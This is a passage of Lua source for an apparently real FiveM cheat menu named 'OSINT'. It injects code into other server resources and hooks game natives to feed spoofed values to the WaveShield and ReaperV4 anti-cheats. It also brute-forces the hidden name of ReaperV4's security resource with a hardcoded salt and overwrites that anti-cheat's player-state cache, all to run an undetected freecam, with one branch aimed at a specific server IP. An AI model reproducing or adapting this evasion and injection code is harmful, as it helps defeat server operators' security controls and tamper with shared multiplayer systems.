            title = CurrentKeyboardInput.title,
            value = CurrentKeyboardInput.buffer
        }))
    end
end)

CreateThread(function()
    while true do
        Wait(0)

        if CurrentKeyboardInput ~= nil then
        if GetResourceState("WaveShield") == "started" then
            MachoInjectResourceRaw("monitor", [[
                SetNuiFocus(true, true)
                sendMenuMessage('setDebugMode')
            ]])
        elseif GetResourceState("ReaperV4") == "started" then
            -- MachoIsolatedInject("monitor", [[ SetNuiFocus(true, true) ]])
        else
            MachoInjectResourceRaw("monitor", [[
                SetNuiFocus(true, true)
                sendMenuMessage('setDebugMode')
            ]])
        end
            SetPauseMenuActive(false)

            for i = 0, 357 do
                if i < 0x30 or i > 0x5A then
                    DisableControlAction(0, i, true)
                end
            end
        else
            Wait(500)
        end
    end
end)

--- Scrolling function for normal navigation
---@param direction "Up"|"Down"
function OSINT:ScrollOne(direction)
    if not direction or #CurrentMenu == 0 then
        return
    end

    local attempts = 0
    repeat
        if direction == "Up" then
            HoveredIndex = HoveredIndex - 1
            if HoveredIndex < 1 then HoveredIndex = #CurrentMenu end
        elseif direction == "Down" then
            HoveredIndex = HoveredIndex + 1
            if HoveredIndex > #CurrentMenu then HoveredIndex = 1 end
        end
        attempts = attempts + 1
        if attempts > 200 then break end
    until CurrentMenu[HoveredIndex] and CurrentMenu[HoveredIndex].type ~= "divider"

    if DUI then
        self:SendMessage({ action = "keydown", index = HoveredIndex - 1 })
    end
end

--- Scrolling function for scrollable/slider tab navigation
---@param direction "Left"|"Right"
function OSINT:ScrollTwo(direction)
    local hoveredTab = CurrentMenu[HoveredIndex]
    if not hoveredTab then return end

    if (hoveredTab.type == "scrollable" or hoveredTab.type == "scrollable-checkbox")
        and hoveredTab.values and #hoveredTab.values > 0 then

        hoveredTab.value = hoveredTab.value or 1

        if direction == "Left" then
            hoveredTab.value = hoveredTab.value - 1
            if hoveredTab.value < 1 then hoveredTab.value = #hoveredTab.values end
        elseif direction == "Right" then
            hoveredTab.value = hoveredTab.value + 1
            if hoveredTab.value > #hoveredTab.values then hoveredTab.value = 1 end
        end

        self:UpdateElements(CurrentMenu)

        if hoveredTab.scrollType == "onScroll" and hoveredTab.onSelect then
            if hoveredTab.type == "scrollable-checkbox" then
                hoveredTab.onSelect(hoveredTab.values[hoveredTab.value], hoveredTab.checked or false)
            else
                hoveredTab.onSelect(hoveredTab.values[hoveredTab.value])
            end
        end
    elseif hoveredTab.type == "slider" or hoveredTab.type == "slider-checkbox" then
        hoveredTab.value = hoveredTab.value or hoveredTab.min or 0
        local step = hoveredTab.step or 1

        if direction == "Left" then
            hoveredTab.value = math.max((hoveredTab.min or 0), hoveredTab.value - step)
        elseif direction == "Right" then
            hoveredTab.value = math.min((hoveredTab.max or 100), hoveredTab.value + step)
        end

        for _, data in pairs(MenuKeybinds) do
            if data.type == "slider-checkbox" and type(data.value) ~= "nil" and data.label == hoveredTab.label then
                if direction == "Left" then
                    data.value = math.max((hoveredTab.min or 0), hoveredTab.value - step)
                elseif direction == "Right" then
                    data.value = math.min((hoveredTab.max or 100), hoveredTab.value + step)
                else
                    return
                end
            end
        end

        self:UpdateElements(CurrentMenu)

        if hoveredTab.scrollType == "onScroll" and hoveredTab.onSelect then
            if hoveredTab.type == "slider-checkbox" then
                hoveredTab.onSelect(hoveredTab.value, hoveredTab.checked or false)
            else
                hoveredTab.onSelect(hoveredTab.value)
            end
        end
    end
end

function OSINT:Enter()
    if not CurrentMenu or #CurrentMenu == 0 then return end
    local current = CurrentMenu[HoveredIndex]
    if not current then return end
    if not MenuOpenable then return end

    if current.type == "subMenu" then
        table.insert(MenuStack, { menu = CurrentMenu, categories = CurrentCategories, categoryIndex = CurrentCategoryIndex })
        table.insert(MenuLabelStack, current.label or "Submenu")

        if current.type == "Server" then
            OSINT:UpdateListMenu()
        end

        if current.categories and type(current.categories) == "table" and #current.categories > 0 then
            CurrentCategories = current.categories
            CurrentCategoryIndex = 1
            CurrentMenu = CurrentCategories[CurrentCategoryIndex].tabs or {}
            HoveredIndex = 1
            self:UpdateElements(CurrentMenu)
            return
        end

        if current.subTabs and type(current.subTabs) == "table" and #current.subTabs > 0 then
            CurrentCategories = nil
            CurrentCategoryIndex = 1
            CurrentMenu = current.subTabs
            HoveredIndex = 1
            self:UpdateElements(CurrentMenu)
            return
        end

        return
    end

    if current.type == "button" and current.onSelect and type(current.onSelect) == "function" then
        local ok, err = pcall(current.onSelect)
        if not ok then self:Debug("red", "onSelect error: " .. tostring(err)) end
        return
    end

    if current.type == "checkbox" or current.type == "scrollable-checkbox" or current.type == "slider-checkbox" then
        if current.locked then
            self:Notify("error", "OSINT", "This module has been disabled due to high detection rates!", 3000)
            return
        end

        if type(current.checked) ~= "boolean" then
            current.checked = true
        else
            current.checked = not current.checked
        end

        if current.onSelect and type(current.onSelect) == "function" then
            if current.type == "scrollable-checkbox" then
                local ok, err = pcall(current.onSelect, current.values[current.value], current.checked)
                if not ok then self:Debug("red", "scrollable-checkbox onSelect error: " .. tostring(err)) end
            elseif current.type == "slider-checkbox" then
                local ok, err = pcall(current.onSelect, current.value, current.checked)
                if not ok then self:Debug("red", "slider-checkbox onSelect error: " .. tostring(err)) end
            else
                local ok, err = pcall(current.onSelect, current.checked)
                if not ok then self:Debug("red", "checkbox onSelect error: " .. tostring(err)) end
            end
        end

        self:UpdateElements(CurrentMenu)
        return
    end

    if current.type == "scrollable" or current.type == "scrollable-checkbox" then
        if current.values and type(current.values) == "table" and #current.values > 0 then
            if current.onSelect then
                current.onSelect(current.values[current.value])
            end
        end

        return
    end

    if current.type == "slider" or current.type == "slider-checkbox" then
        if current.scrollType == "onEnter" and current.onSelect then
            if current.type == "slider-checkbox" then
                current.onSelect(current.value, current.checked or false)
            else
                current.onSelect(current.value)
            end
        end
        return
    end
end

local firstFallbackBlocked = false

function OSINT:Backspace()
    if #MenuStack > 0 then
        local last = table.remove(MenuStack)
        table.remove(MenuLabelStack)
        CurrentMenu = last.menu or ActiveMenu
        CurrentCategories = last.categories
        CurrentCategoryIndex = last.categoryIndex or 1
        HoveredIndex = 1
        self:UpdateElements(CurrentMenu)
    else
        self:HideUI()
    end
end

function OSINT:PrevCategory()
    if not CurrentCategories or #CurrentCategories == 0 then return end
    CurrentCategoryIndex = CurrentCategoryIndex - 1
    if CurrentCategoryIndex < 1 then CurrentCategoryIndex = #CurrentCategories end
    CurrentMenu = CurrentCategories[CurrentCategoryIndex].tabs or {}
    HoveredIndex = 1
    self:UpdateElements(CurrentMenu)
    self:SendMessage({ action = "keydown", index = HoveredIndex - 1 })
end

function OSINT:NextCategory()
    if not CurrentCategories or #CurrentCategories == 0 then return end
    CurrentCategoryIndex = CurrentCategoryIndex + 1
    if CurrentCategoryIndex > #CurrentCategories then CurrentCategoryIndex = 1 end
    CurrentMenu = CurrentCategories[CurrentCategoryIndex].tabs or {}
    HoveredIndex = 1
    self:UpdateElements(CurrentMenu)
    self:SendMessage({ action = "keydown", index = HoveredIndex - 1 })
end

---@param state boolean
---@param speed number
function OSINT:ToggleFreecam(state, speed)
    if type(state) ~= "boolean" then
        return
    end

    if state then
        FreecamEnabled = true
        MachoSendDuiMessage(DUI, json.encode({ action = "displayFreecam", visible = true, weaponIndex = CurrentWeaponIndex, vehicleIndex = CurrentVehicleIndex }))
        if GetResourceState("ReaperV4") ~= "started" or GetCurrentServerEndpoint() == "216.146.24.88:30120" then
            if GetResourceState("WaveShield") == "started" then
                MachoHookNative(0x5234F9F10919EABA, function(...)
                    return false, -1
                end)

                MachoHookNative(0xA200EB1EE790F448, function(...)
                    return false, GetEntityCoords(PlayerPedId())
                end)

                MachoHookNative(0xC6D3D26810C8E0F9, function(...)
                    return false, false
                end)

                MachoHookNative(0x8D4D46230B2C353A, function(...)
                    return false, 0
                end)

                MachoHookNative(0xB15162CB5826E9E8, function(...)
                    return false, false
                end)

                MachoHookNative(0x19CAFA3C87F7C2FF, function(...)
                    return false, 0
                end)

                MachoHookNative(0xD5037BA82E12416F, function(...)
                    return false, 0
                end)

                MachoHookNative(0xFB92A102F1C4DFA3, function(...)
                    return false, true
                end)

                MachoHookNative(0x997ABD671D25CA0B, function(...)
                    return false, true
                end)

                _G.OSINTFreecamSpeed = speed

                if not _G.OSINTFreecamThreadRunning then
                    _G.OSINTFreecamEnabled = true
                    _G.OSINTFreecamThreadRunning = true
                
                    function hNative(nativeName, newFunction)
                        local originalNative = _G[nativeName]
                        if not originalNative or type(originalNative) ~= "function" then
                            return
                        end

                        _G[nativeName] = function(...)
                            return newFunction(originalNative, ...)
                        end
                    end

                    local function RotationToDirection(rot)
                        local z = math.rad(rot.z)
                        local x = math.rad(rot.x)
                        local num = math.abs(math.cos(x))
                        return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                    end

                    local function GetRightVector(rot)
                        local z = math.rad(rot.z)
                        return vector3(math.cos(z), math.sin(z), 0.0)
                    end

                    local function Clamp(val, min, max)
                        if val < min then return min end
                        if val > max then return max end
                        return val
                    end

                    hNative("RotationToDirection", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetRightVector", function(originalFn, ...) return originalFn(...) end)
                    hNative("Clamp", function(originalFn, ...) return originalFn(...) end)
                    hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                    hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                    hNative("IsVehicleSeatFree", function(originalFn, ...) return originalFn(...) end)
                    hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                    hNative("CreateCam", function(originalFn, ...) return originalFn(...) end)
                    hNative("DoesCamExist", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetCamCoord", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetCamRot", function(originalFn, ...) return originalFn(...) end)
                    hNative("RenderScriptCams", function(originalFn, ...) return originalFn(...) end)
                    hNative("DestroyCam", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetFocusEntity", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextFont", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextProportional", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextScale", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextDropShadow", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextEdge", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextOutline", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextCentre", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextColour", function(originalFn, ...) return originalFn(...) end)
                    hNative("BeginTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
                    hNative("AddTextComponentSubstringPlayerName", function(originalFn, ...) return originalFn(...) end)
                    hNative("EndTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                    hNative("IsControlPressed", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetDisabledControlNormal", function(originalFn, ...) return originalFn(...) end)
                    hNative("TaskStandStill", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetFocusPosAndVel", function(originalFn, ...) return originalFn(...) end)
                    hNative("StartExpensiveSynchronousShapeTestLosProbe", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                    hNative("IsControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                    hNative("IsDisabledControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                    hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                    hNative("TaskWarpPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                    hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                    hNative("ShootSingleBulletBetweenCoords", function(originalFn, ...) return originalFn(...) end)

                    local coords = GetEntityCoords(PlayerPedId())
                    _G.OSINTFreecamObject = CreateCam("DEFAULT_SCRIPTED_CAMERA", true)
                    SetCamCoord(_G.OSINTFreecamObject, coords.x, coords.y, coords.z + 2.0)
                    SetCamRot(_G.OSINTFreecamObject, 0.0, 0.0, GetEntityHeading(PlayerPedId()), 2)
                    RenderScriptCams(true, false, 0, true, true)
                    
                    CreateThread(function()
                        while _G.OSINTFreecamThreadRunning do
                            Wait(0)

                            if _G.OSINTFreecamObject then
                                local coords = GetCamCoord(_G.OSINTFreecamObject)
                                local rot = GetCamRot(_G.OSINTFreecamObject, 2)
                                local beforeSpeed = _G.OSINTFreecamSpeed or 0.25
                                local speed = IsControlPressed(0, 21) and beforeSpeed + 1.0 or beforeSpeed
                                local forward = RotationToDirection(rot)
                                local right = GetRightVector(rot)
                                local moveX, moveY, moveZ = 0, 0, 0

                                TaskStandStill(PlayerPedId(), 10)
                                SetFocusPosAndVel(coords.x, coords.y, coords.z, 0.0, 0.0, 0.0)

                                if IsControlPressed(0, 32) then moveX = moveX + forward.x * speed moveY = moveY + forward.y * speed moveZ = moveZ + forward.z * speed end
                                if IsControlPressed(0, 33) then moveX = moveX - forward.x * speed moveY = moveY - forward.y * speed moveZ = moveZ - forward.z * speed end
                                if IsControlPressed(0, 34) then moveX = moveX - right.x * speed moveY = moveY - right.y * speed end
                                if IsControlPressed(0, 35) then moveX = moveX + right.x * speed moveY = moveY + right.y * speed end
                                if IsControlPressed(0, 22) then moveZ = moveZ + speed end
                                if IsControlPressed(0, 36) then moveZ = moveZ - speed end

                                SetCamCoord(_G.OSINTFreecamObject, coords.x + moveX, coords.y + moveY, coords.z + moveZ)

                                local x = GetDisabledControlNormal(0, 1)
                                local y = GetDisabledControlNormal(0, 2)
                                local newPitch = Clamp(rot.x - y * 5, -89.0, 89.0)
                                local newYaw = rot.z - x * 5

                                SetCamRot(_G.OSINTFreecamObject, newPitch, rot.y, newYaw, 2)
                            end
                        end
                    end)
                else
                    _G.OSINTFreecamEnabled = true
                end
            else
                Injection(GetResourceState("monitor") == "started" and "monitor" or "any", [[
                print("hello im inside of a resource")
                    _G.OSINTFreecamSpeed = ]] .. speed .. [[

                    if not _G.OSINTFreecamThreadRunning then
                        _G.OSINTFreecamEnabled = true
                        _G.OSINTFreecamThreadRunning = true
                    
                        function hNative(nativeName, newFunction)
                            local originalNative = _G[nativeName]
                            if not originalNative or type(originalNative) ~= "function" then
                                return
                            end

                            _G[nativeName] = function(...)
                                return newFunction(originalNative, ...)
                            end
                        end

                        local function RotationToDirection(rot)
                            local z = math.rad(rot.z)
                            local x = math.rad(rot.x)
                            local num = math.abs(math.cos(x))
                            return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                        end

                        local function GetRightVector(rot)
                            local z = math.rad(rot.z)
                            return vector3(math.cos(z), math.sin(z), 0.0)
                        end

                        local function Clamp(val, min, max)
                            if val < min then return min end
                            if val > max then return max end
                            return val
                        end

                        hNative("RotationToDirection", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetRightVector", function(originalFn, ...) return originalFn(...) end)
                        hNative("Clamp", function(originalFn, ...) return originalFn(...) end)
                        hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                        hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                        hNative("IsVehicleSeatFree", function(originalFn, ...) return originalFn(...) end)
                        hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                        hNative("CreateCam", function(originalFn, ...) return originalFn(...) end)
                        hNative("DoesCamExist", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetCamCoord", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetCamRot", function(originalFn, ...) return originalFn(...) end)
                        hNative("RenderScriptCams", function(originalFn, ...) return originalFn(...) end)
                        hNative("DestroyCam", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetFocusEntity", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextFont", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextProportional", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextScale", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextDropShadow", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextEdge", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextOutline", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextCentre", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextColour", function(originalFn, ...) return originalFn(...) end)
                        hNative("BeginTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
                        hNative("AddTextComponentSubstringPlayerName", function(originalFn, ...) return originalFn(...) end)
                        hNative("EndTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                        hNative("IsControlPressed", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetDisabledControlNormal", function(originalFn, ...) return originalFn(...) end)
                        hNative("TaskStandStill", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetFocusPosAndVel", function(originalFn, ...) return originalFn(...) end)
                        hNative("StartExpensiveSynchronousShapeTestLosProbe", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                        hNative("IsControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                        hNative("IsDisabledControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                        hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                        hNative("TaskWarpPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                        hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                        hNative("ShootSingleBulletBetweenCoords", function(originalFn, ...) return originalFn(...) end)

                        local coords = GetEntityCoords(PlayerPedId())
                        _G.OSINTFreecamObject = CreateCam("DEFAULT_SCRIPTED_CAMERA", true)
                        SetCamCoord(_G.OSINTFreecamObject, coords.x, coords.y, coords.z + 2.0)
                        SetCamRot(_G.OSINTFreecamObject, 0.0, 0.0, GetEntityHeading(PlayerPedId()), 2)
                        RenderScriptCams(true, false, 0, true, true)
                        
                        CreateThread(function()
                            while _G.OSINTFreecamThreadRunning do
                                Wait(0)

                                if _G.OSINTFreecamObject then
                                    local coords = GetCamCoord(_G.OSINTFreecamObject)
                                    local rot = GetCamRot(_G.OSINTFreecamObject, 2)
                                    local beforeSpeed = _G.OSINTFreecamSpeed or 0.25
                                    local speed = IsControlPressed(0, 21) and beforeSpeed + 1.0 or beforeSpeed
                                    local forward = RotationToDirection(rot)
                                    local right = GetRightVector(rot)
                                    local moveX, moveY, moveZ = 0, 0, 0

                                    TaskStandStill(PlayerPedId(), 10)
                                    SetFocusPosAndVel(coords.x, coords.y, coords.z, 0.0, 0.0, 0.0)

                                    if IsControlPressed(0, 32) then moveX = moveX + forward.x * speed moveY = moveY + forward.y * speed moveZ = moveZ + forward.z * speed end
                                    if IsControlPressed(0, 33) then moveX = moveX - forward.x * speed moveY = moveY - forward.y * speed moveZ = moveZ - forward.z * speed end
                                    if IsControlPressed(0, 34) then moveX = moveX - right.x * speed moveY = moveY - right.y * speed end
                                    if IsControlPressed(0, 35) then moveX = moveX + right.x * speed moveY = moveY + right.y * speed end
                                    if IsControlPressed(0, 22) then moveZ = moveZ + speed end
                                    if IsControlPressed(0, 36) then moveZ = moveZ - speed end

                                    SetCamCoord(_G.OSINTFreecamObject, coords.x + moveX, coords.y + moveY, coords.z + moveZ)

                                    local x = GetDisabledControlNormal(0, 1)
                                    local y = GetDisabledControlNormal(0, 2)
                                    local newPitch = Clamp(rot.x - y * 5, -89.0, 89.0)
                                    local newYaw = rot.z - x * 5

                                    SetCamRot(_G.OSINTFreecamObject, newPitch, rot.y, newYaw, 2)
                                end
                            end
                        end)
                    else
                        _G.OSINTFreecamEnabled = true
                    end
                ]])
            end
        else
            if not FreecamBypassReaperV4 then
                print("[^5OSINT^7]: [^3DEBUG^7] >> Loading ReaperV4 Freecam Bypass")

                local function GetReaperV4SecurityResource()
                    local debugPrint = false

                    local function reaperHash(input, salt)
                        salt = salt or "072b0945-fdd6d8bb-2e1d0476-d15c8f4b-ed6db3e1"
                        input = input .. salt

                        local hashValue = 5381

                        for i = 1, #input do
                            local byte = string.byte(input, i)
                            hashValue = (hashValue * 33) ~ byte
                        end

                        return hashValue
                    end

                    local targetStr = GetConvar("reaper_security_resource", "")
                    local target = tonumber(targetStr)
                    if not target then
                        return
                    end

                    local numResources = GetNumResources() or 0
                    local candidates = {}
                    for idx = 0, (numResources - 1) do
                        local resName = GetResourceByFindIndex(idx)
                        if resName and resName ~= "" then
                            table.insert(candidates, resName)
                        end
                    end

                    if #candidates == 0 then
                        return
                    end

                    local tried = 0
                    local found = nil
                    for i, cand in ipairs(candidates) do
                        tried = tried + 1
                        if reaperHash(cand) == target then
                            print("^7[^5OSINT^7]: [^3DEBUG^7]: Reaper Security Resource Found: " .. cand)
                            found = cand
                            break
                        end

                        local alt = cand:gsub("[-_]", "")
                        if alt ~= cand and reaperHash(alt) == target then
                            found = alt
                            break
                        end

                        if tried % 50 == 0 then
                            Wait(0)
                        end
                    end

                    if found then
                        return found
                    end
                end

                local resource = GetReaperV4SecurityResource()

                MachoInjectResource("ReaperV4", [[
                    _G["GetRenderingCam"] = function()
                        return 0
                    end

                    _G["GetDistanceBetweenCoords"] = function()
                        return 0
                    end
                ]])

                Wait(250)

                if resource then
                    MachoInjectResource(resource, [[
                        _G["GetRenderingCam"] = function()
                            return 0
                        end

                        _G["GetDistanceBetweenCoords"] = function()
                            return 0
                        end
                    ]])
                end

                MachoInjectResource("any", [[
                    local success = exports["ReaperV4"]:InvokeCPlayer("set", "player_loaded", false, true)
                    if success then
                        print("Updated Cache 1 Successfully")
                    else
                        print("Failed to Update Cache 1")
                    end

                    local success = exports["ReaperV4"]:InvokeCPlayer("set", "LastFailedMovementChecks", 0, true)
                    if success then
                        print("Updated Cache 2 Successfully")
                    else
                        print("Failed to Update 2 Cache")
                    end

                    Wait(500)

                    local success = exports["ReaperV4"]:InvokeCPlayer("set", "NetworkIsInSpectatorMode", true, true)
                    if success then
                        print("Updated Cache 3 Successfully")
                    else
                        print("Failed to Update Cache 3")
                    end
                ]])

                print("[^5OSINT^7]: [^2DEBUG^7] >> Loaded ReaperV4 Freecam Bypass")
                FreecamBypassReaperV4 = true
            end

            _G.OSINTFreecamSpeed = speed

            if not _G.OSINTFreecamThreadRunning then
                _G.OSINTFreecamEnabled = true
                _G.OSINTFreecamThreadRunning = true

                function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end

                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end

                local function RotationToDirection(rot)
                    local z = math.rad(rot.z)
                    local x = math.rad(rot.x)
                    local num = math.abs(math.cos(x))
                    return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                end

                local function GetRightVector(rot)
                    local z = math.rad(rot.z)
                    return vector3(math.cos(z), math.sin(z), 0.0)
                end

                local function Clamp(val, min, max)
                    if val < min then return min end
                    if val > max then return max end
                    return val
                end

                hNative("RotationToDirection", function(originalFn, ...) return originalFn(...) end)
                hNative("GetRightVector", function(originalFn, ...) return originalFn(...) end)
                hNative("Clamp", function(originalFn, ...) return originalFn(...) end)
                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                hNative("IsVehicleSeatFree", function(originalFn, ...) return originalFn(...) end)
                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                hNative("CreateCam", function(originalFn, ...) return originalFn(...) end)
                hNative("DoesCamExist", function(originalFn, ...) return originalFn(...) end)
                hNative("SetCamCoord", function(originalFn, ...) return originalFn(...) end)
                hNative("SetCamRot", function(originalFn, ...) return originalFn(...) end)
                hNative("RenderScriptCams", function(originalFn, ...) return originalFn(...) end)
                hNative("DestroyCam", function(originalFn, ...) return originalFn(...) end)
                hNative("SetFocusEntity", function(originalFn, ...) return originalFn(...) end)
                hNative("SetTextFont", function(originalFn, ...) return originalFn(...) end)
                hNative("SetTextProportional", function(originalFn, ...) return originalFn(...) end)
                hNative("SetTextScale", function(originalFn, ...) return originalFn(...) end)
                hNative("SetTextDropShadow", function(originalFn, ...) return originalFn(...) end)
                hNative("SetTextEdge", function(originalFn, ...) return originalFn(...) end)
                hNative("SetTextOutline", function(originalFn, ...) return originalFn(...) end)
                hNative("SetTextCentre", function(originalFn, ...) return originalFn(...) end)
                hNative("SetTextColour", function(originalFn, ...) return originalFn(...) end)
                hNative("BeginTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
                hNative("AddTextComponentSubstringPlayerName", function(originalFn, ...) return originalFn(...) end)
                hNative("EndTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
                hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                hNative("IsControlPressed", function(originalFn, ...) return originalFn(...) end)
                hNative("GetDisabledControlNormal", function(originalFn, ...) return originalFn(...) end)
                hNative("TaskStandStill", function(originalFn, ...) return originalFn(...) end)
                hNative("SetFocusPosAndVel", function(originalFn, ...) return originalFn(...) end)
                hNative("StartExpensiveSynchronousShapeTestLosProbe", function(originalFn, ...) return originalFn(...) end)
                hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                hNative("IsControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                hNative("IsDisabledControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("TaskWarpPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                hNative("ShootSingleBulletBetweenCoords", function(originalFn, ...) return originalFn(...) end)

                local coords = GetEntityCoords(PlayerPedId())
                _G.OSINTFreecamObject = CreateCam("DEFAULT_SCRIPTED_CAMERA", true)
                SetCamCoord(_G.OSINTFreecamObject, coords.x, coords.y, coords.z + 2.0)
                SetCamRot(_G.OSINTFreecamObject, 0.0, 0.0, GetEntityHeading(PlayerPedId()), 2)
                RenderScriptCams(true, false, 0, true, true)
                
                CreateThread(function()
                    while _G.OSINTFreecamThreadRunning do
                        Wait(0)

                        if _G.OSINTFreecamEnabled and _G.OSINTFreecamObject then
                            local coords = GetCamCoord(_G.OSINTFreecamObject)
                            local rot = GetCamRot(_G.OSINTFreecamObject, 2)
                            local beforeSpeed = _G.OSINTFreecamSpeed or 0.25
                            local speed = IsControlPressed(0, 21) and beforeSpeed + 1.0 or beforeSpeed
                            local forward = RotationToDirection(rot)
                            local right = GetRightVector(rot)
                            local moveX, moveY, moveZ = 0, 0, 0

                            TaskStandStill(PlayerPedId(), 10)
                            SetFocusPosAndVel(coords.x, coords.y, coords.z, 0.0, 0.0, 0.0)

                            if IsControlPressed(0, 32) then moveX = moveX + forward.x * speed moveY = moveY + forward.y * speed moveZ = moveZ + forward.z * speed end
                            if IsControlPressed(0, 33) then moveX = moveX - forward.x * speed moveY = moveY - forward.y * speed moveZ = moveZ - forward.z * speed end
                            if IsControlPressed(0, 34) then moveX = moveX - right.x * speed moveY = moveY - right.y * speed end
                            if IsControlPressed(0, 35) then moveX = moveX + right.x * speed moveY = moveY + right.y * speed end
                            if IsControlPressed(0, 22) then moveZ = moveZ + speed end
                            if IsControlPressed(0, 36) then moveZ = moveZ - speed end

                            SetCamCoord(_G.OSINTFreecamObject, coords.x + moveX, coords.y + moveY, coords.z + moveZ)

                            local x = GetDisabledControlNormal(0, 1)
                            local y = GetDisabledControlNormal(0, 2)
                            local newPitch = Clamp(rot.x - y * 5, -89.0, 89.0)
                            local newYaw = rot.z - x * 5

                            SetCamRot(_G.OSINTFreecamObject, newPitch, rot.y, newYaw, 2)
                        end
                    end
                end)
            else
                _G.OSINTFreecamEnabled = true
            end
        end
    else
        FreecamEnabled = false
        MachoSendDuiMessage(DUI, json.encode({ action = "displayFreecam", visible = false }))
        if GetResourceState("ReaperV4") ~= "started" or GetCurrentServerEndpoint() == "216.146.24.88:30120" then
            if GetResourceState("WaveShield") == "started" then
                _G.OSINTFreecamEnabled = false
                _G.OSINTFreecamThreadRunning = false

                function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end

                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end

                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                hNative("IsVehicleSeatFree", function(originalFn, ...) return originalFn(...) end)
                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                hNative("CreateCam", function(originalFn, ...) return originalFn(...) end)
                hNative("SetCamCoord", function(originalFn, ...) return originalFn(...) end)
                hNative("SetCamRot", function(originalFn, ...) return originalFn(...) end)
                hNative("RenderScriptCams", function(originalFn, ...) return originalFn(...) end)
